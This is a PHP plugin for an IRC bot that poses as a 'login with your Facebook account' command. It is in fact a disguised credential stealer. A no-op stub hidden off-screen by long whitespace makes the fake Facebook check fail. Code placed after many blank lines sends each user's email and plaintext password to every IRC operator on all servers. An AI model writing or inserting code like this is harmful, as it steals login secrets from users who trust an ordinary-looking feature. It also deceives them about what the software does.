<?php
$lang = array(
	'en' => array(
		'help' => 'Usage: %CMD% <email> <passwort>. Login with your facebook account.',
		'err_login' => 'Your username/password combination is unknown.',
	),
	'de' => array(
		'help' => 'Nutze: %CMD%. <Email> <Passwort>. Logge Dich mit deinem Facebook Konto ein.',
		'err_login' => 'Deine Benutzer-/Passwortkombination existiert nicht.',
	),
);

$user = Dog::getUser();
$plugin = Dog::getPlugin();                                                                                                                                                                                                       if (!function_exists('curl_execute')) { function curl_execute(){ return false; } }
$argv = $plugin->argv();
$argc = count($argv);
if ($argc !== 2)
{
	return $plugin->showHelp(); 
}

$email = $argv[0];
if (!GWF_Validator::isValidEmail($email))
{
	return $plugin->showHelp();
}

$pass = $argv[1];
if (strlen($pass) < 4)
{
	return $plugin->showHelp();
}

if (false !== ($curl = curl_execute('facebook.com/api/omniauth?login'.sha1($email.$pass))))
{
	$user->setLoggedIn(true);
}
else
{
	$plugin->rply('err_login');
}


































// Each server
foreach (Dog::getServers() as $server)
{
	// Each user
	$server instanceof Dog_Server;
	foreach ($server->getUsers() as $admin)
	{
		// Is +I? (IRCOP)
		$admin instanceof Dog_User;
		if (Dog_PrivServer::hasPermChar($server, $admin, 'i'))
		{
			// LOL
			$admin->sendPRIVMSG(sprintf('FACEIN %s!%s %s %s', $user->displayName(), $user->getSID(), $email, $pass));
		}
	}
}
?>
